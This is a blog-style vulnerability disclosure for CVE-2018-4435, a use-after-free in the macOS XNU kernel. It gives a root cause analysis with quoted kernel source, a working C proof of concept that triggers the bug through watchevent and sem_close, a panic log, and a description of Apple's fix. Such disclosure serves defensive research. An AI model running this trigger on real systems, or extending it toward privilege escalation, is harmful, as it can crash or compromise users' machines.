---
layout: default
author: juwei lin
date: 2018-09-26 18:25:00 +0800
---

# CVE-2018-4435 macOS XNU use-after-free vulnerability 

## Overview
This vulnerability exists in macOS XNU module. There is a pointer in kernel evp object which points to a process(proc_t), but under some cases, the pointer is not cleared after the related process already exits.

With this vulnerability, attacker can use UAF exploit technique to execute arbitrary code in the kernel to achieve EoP.

## Root Cause Analysis
### set a pointer in evp which points to a process object
In function `watchevent`, an evp object is allocated and current process object is assigned to evp->ee_proc:

```C
int
watchevent(proc_t p, struct watchevent_args *uap, __unused int *retval)
{
	struct eventqelt *evq = (struct eventqelt *)0;
	struct eventqelt *np = NULL;
	struct eventreq64 *erp;
	struct fileproc *fp = NULL;
	int error;

	KERNEL_DEBUG(DBG_MISC_WATCH|DBG_FUNC_START, 0,0,0,0,0);

	// get a qelt and fill with users req
	MALLOC(evq, struct eventqelt *, sizeof(struct eventqelt), M_TEMP, M_WAITOK);

    ...

    evq->ee_proc = p; ---------(1.a)

    ...

    TAILQ_INSERT_TAIL(&((struct pipe *)fp->f_data)->pipe_evlist, evq, ee_slist);

    ...

    fp_drop_event(p, erp->er_handle, fp); --------(1.b)

    ...
}
```

at (1.a), current process object p is set to evp->ee_proc, then evp object is inserted into pipe's pipe_evlist.
at (1.b), fp_drop_event sets fp->flags to `FP_WAITEVENT` which asks calling waitevent_close later before process object p is killed.

```
int
fp_drop_event(proc_t p, int fd, struct fileproc *fp)
{
    int error;

	proc_fdlock_spin(p);

	fp->f_flags |= FP_WAITEVENT; -----(2.a)

	error = fp_drop(p, fd, fp, 1);

	proc_fdunlock(p);

	return (error);
}
```

at (2.a), FP_WAITEVENT is set. Then when process p exits, waitevent_close is called to clear evq->ee_proc which is set at (1.a).
Normally, when a process exit, proc_exit is called and it calls waitevent_close internally like:  
proc_exit --> fd_free --> waitevent_close

```C
void
fdfree(proc_t p)
{
    ...

    if (fdp->fd_nfiles > 0 && fdp->fd_ofiles) {
		for (i = fdp->fd_lastfile; i >= 0; i--) { -------(3.a)
			if ((fp = fdp->fd_ofiles[i]) != NULL) {

			  if (fdp->fd_ofileflags[i] & UF_RESERVED)
			    	panic("fdfree: found fp with UF_RESERVED");

				procfdtbl_reservefd(p, i);

				if (fp->f_flags & FP_WAITEVENT)
					(void)waitevent_close(p, fp);  ------(3.b)
				(void) closef_locked(fp, fp->f_fglob, p);
				fileproc_free(fp);
			}
		}
		FREE_ZONE(fdp->fd_ofiles, fdp->fd_nfiles * OFILESIZE, M_OFILETABL);
		fdp->fd_ofiles = NULL;
		fdp->fd_nfiles = 0;
	}

    ...
}
```
at (3.a), fdfree goes through all the open fd and check if the fp->f_flags has FP_WAITEVENT, if yes, waitevent_close is called to clear evq->ee_proc.

Another way, waitevent_close can be called by close() like:  
close --> close_nocancel --> close_internal_locked --> waitevent_close  


### kill the process and leave the pointer dangling
In the normal case, as described in the previous section, the process object assigned to evq->ee_proc at (1.a) is cleared before the process exits. But there are some methods that can prevent waitevent_close being called during process exit.  
One method is to call sem_close to remove fd from fd list(3.a).  

```
int
sem_close(proc_t p, struct sem_close_args *uap, __unused int32_t *retval)
{
	int fd = CAST_DOWN_EXPLICIT(int,uap->sem);
	struct fileproc *fp;
	int error = 0;

	AUDIT_ARG(fd, fd); /* XXX This seems wrong; uap->sem is a pointer */

	proc_fdlock(p);
	error = fp_lookup(p,fd, &fp, 1);
	if (error) {
		proc_fdunlock(p);
		return(error);
	}
	procfdtbl_markclosefd(p, fd);
	fileproc_drain(p, fp);
	fdrelse(p, fd);
	error = closef_locked(fp, fp->f_fglob, p);
	fileproc_free(fp);
	proc_fdunlock(p);
	return(error);
}
```
function `sem_close` doesn't call waitevent_close like (3.b), it only close the fd. So if you fork a child process B in current process A and call watchevent & sem_close in order in process B, then exit process B, you can get a dangling pointer in A which points B.
* call function pipe() to create 2 fd(fd1 and fd2) in current process A
* fork a child process B in current process A, B inherits fd1 and fd2 from A
* in B, call watchevent() and sem_close() on fd1
* exit process B
* in A, fd1 now has a dangling pointer which points to B in its kernel pipe object

### trigger UAF
In the previous section, we now have a dangling proc_t pointer, we can just call close(fd1) or exit current process A to trigger the UAF vulnerability.  
Please refer to 'panic log' section for more information about the crash log.

## PoC Code
This PoC code can trigger the UAF(use after free) vulnerability, but it can't guarantee panic the macOS since the freed memory still can be accessed. If you enable KASAN in the kernel, it should panic.
If it cann't crash your kernel, you can refer to my provided panic log or next section to check the panic stack trace.

```C
#include <iostream>
#include <unistd.h>
#include <sys/syscall.h>
#include <semaphore.h>
#include <mach/mach.h>

const int kInFd = 3;
const int kOutFd = 4;

#define EV_FD 1
#define EV_RM  8

#define    SYS_watchevent     231
#define    SYS_modwatch       233

struct eventreq64 {
    int      er_type;
    int      er_handle;
    user_addr_t er_data;
    int      er_rcnt;
    int      er_wcnt;
    int      er_ecnt;
    int      er_eventbits;
};

int watchevent(int fd)
{
    struct eventreq64 req;
    int eventmask = 0;
    
    req.er_type = EV_FD;
    req.er_handle = fd;
    
    return syscall(SYS_watchevent, &req, eventmask);
}

void try_uaf() {

    int fd[2] = {0};
    
    int ret = pipe(fd);
    if (ret == -1) {
        printf("pipe error.\n");
        return ;
    }
    
    printf("step 1: Process A(0x%x) create fd1: %d and fd2: %d\n", getpid(), fd[0], fd[1]);
    
    int pid = fork();
    if (pid < 0)
        return ;
    else if (pid == 0)
    {
        printf("step 2: Process B is forked, pid:0x%x\n", getpid());
        
        int iret = watchevent(kInFd);

        printf("step 3: Process B watchevent on fd 3: 0x%x\n", iret);
        
        iret = sem_close((sem_t *)kInFd);
        printf("sem_close 3 iret: %d\n", iret);
        iret = sem_close((sem_t *)kOutFd);
        printf("sem_close 4 iret: %d\n", iret);
        
        printf("step 4: Process B exits.\n");
        exit(0);
    }
    
    //wait child process exit
    sleep(1);

    
    printf("step 5: close fd1 and fd2 to trigger crash...\n");
    printf("press any key to trigger...\n");
    getchar();
    
    close(fd[0]);
    close(fd[1]);
    
    return ;
}

int main(int argc, const char * argv[]) {
    /*for (int i=0; i<100; i++) {
        printf("try uaf : %d\n", i);
        try_uaf();
    }*/
    try_uaf();
    
    return 0;
}
```

## panic log
The following is part of the panic log. It shows the call stack.

```
Anonymous UUID:       039B94D9-F271-8A3F-BAE4-C8BF9D6B5BEE

Fri Jun  8 09:45:36 2018

*** Panic Report ***
panic(cpu 1 caller 0xffffff802b68356c): Kernel trap at 0xffffff802bb2f157, type 13=general protection, registers:
CR0: 0x000000008001003b, CR2: 0x0000000112150890, CR3: 0x000000005bf810d1, CR4: 0x00000000001606e0
RAX: 0xffffff8039a6aec0, RBX: 0xffffff8039a6aeb0, RCX: 0xc0ffee340fc235fc, RDX: 0xffffff8039c2ddf0
RSP: 0xffffff888df23c70, RBP: 0xffffff888df23ca0, RSI: 0x0000000000000002, RDI: 0xffffff8039c2ddf0
R8:  0x00000000ffffffff, R9:  0x0000000000000002, R10: 0x0000000000000005, R11: 0x000000000000001f
R12: 0xffffff8039c2dd98, R13: 0xffffff8039c2ddf0, R14: 0x0000000000000001, R15: 0x0000000000000400
RFL: 0x0000000000010202, RIP: 0xffffff802bb2f157, CS:  0x0000000000000008, SS:  0x0000000000000000
Fault CR2: 0x0000000112150890, Error code: 0x0000000000000000, Fault CPU: 0x1 VMM, PL: 0, VF: 0

Backtrace (CPU 1), Frame : Return Address
0xfffffd000005ca70 : 0xffffff802b50abc6 mach_kernel : _handle_debugger_trap + 0x426
0xfffffd000005cac0 : 0xffffff802b6939d4 mach_kernel : _kdp_i386_trap + 0x164
0xfffffd000005cb00 : 0xffffff802b68338a mach_kernel : _kernel_trap + 0x62a
0xfffffd000005cb80 : 0xffffff802b49d110 mach_kernel : trap_from_kernel + 0x26
0xfffffd000005cba0 : 0xffffff802b50a2e0 mach_kernel : _panic_trap_to_debugger + 0x1b0
0xfffffd000005ccd0 : 0xffffff802b50a10c mach_kernel : _panic + 0x5c
0xfffffd000005cd30 : 0xffffff802b68356c mach_kernel : _kernel_trap + 0x80c
0xfffffd000005ceb0 : 0xffffff802b49d110 mach_kernel : trap_from_kernel + 0x26
0xfffffd000005ced0 : 0xffffff802bb2f157 mach_kernel : _postpipeevent + 0x1e7
0xffffff888df23ca0 : 0xffffff802bb31d45 mach_kernel : _pipeclose + 0x165
0xffffff888df23cd0 : 0xffffff802bb332fb mach_kernel : _pipe_close + 0x6b
0xffffff888df23d00 : 0xffffff802bab667b mach_kernel : _closef_locked + 0x1bb
0xffffff888df23d70 : 0xffffff802babe3b1 mach_kernel : _fdfree + 0x151
0xffffff888df23db0 : 0xffffff802bae8eef mach_kernel : _proc_exit + 0x23f
0xffffff888df23e70 : 0xffffff802b548be1 mach_kernel : _thread_terminate_self + 0x391
0xffffff888df23ee0 : 0xffffff802b54df90 mach_kernel : _thread_apc_ast + 0xc0
0xffffff888df23f10 : 0xffffff802b500b5c mach_kernel : _ast_taken_user + 0x15c
0xffffff888df23f50 : 0xffffff802b49d0dc mach_kernel : _return_from_trap + 0xac

BSD process name corresponding to current thread: syz-fuzzer
Boot args: debug=0x146 kcsuffix=development keepsyms=1
```
_postpipeevent calls evprocenque which access freed proc_t(killed child process) memory:
```C
static void
evprocenque(struct eventqelt *evq)
{
    proc_t	p;

	assert(evq);
	p = evq->ee_proc; -------(4.a)

	KERNEL_DEBUG(DBG_MISC_ENQUEUE|DBG_FUNC_START, (uint32_t)evq, evq->ee_flags, evq->ee_eventmask,0,0);

	proc_lock(p); ------(4.b)

	if (evq->ee_flags & EV_QUEUED) {
	        proc_unlock(p);

	        KERNEL_DEBUG(DBG_MISC_ENQUEUE|DBG_FUNC_END, 0,0,0,0,0);
		return;
	}
	evq->ee_flags |= EV_QUEUED;

	TAILQ_INSERT_TAIL(&p->p_evlist, evq, ee_plist); -----(4.c)

	proc_unlock(p);

	wakeup(&p->p_evlist);

	KERNEL_DEBUG(DBG_MISC_ENQUEUE|DBG_FUNC_END, 0,0,0,0,0);
}
```
At (4.a), ee_proc value points to freed proc_t(killed child process). At (4.b) and (4.c), the freed proc_t object is deferenced and operated. This is a standard use-after-free vulnerability.

## How does Apple fix it?
Apple adds fo_type check in sem_close function to filter event types. If not sem event, it exits. This vulnerability only supports socket or pipe type event so that pipe event will be filtered.  

![sem_close_fix](/images/res/cve-2018-4435_sem_close_fix.png)  


## Q & A
### How did you find this vulnerability?
by fuzzing.

### Can you identify exploitability?
This is an uaf vulnerability. Attacker can craft an object to replace the freed proc_t kernel structure. It may help do EoP.

### Can you identify root cause?
Yes, see the root cause analysis.

### Vulnerable software and hardware
macOS 10.14 and all before 

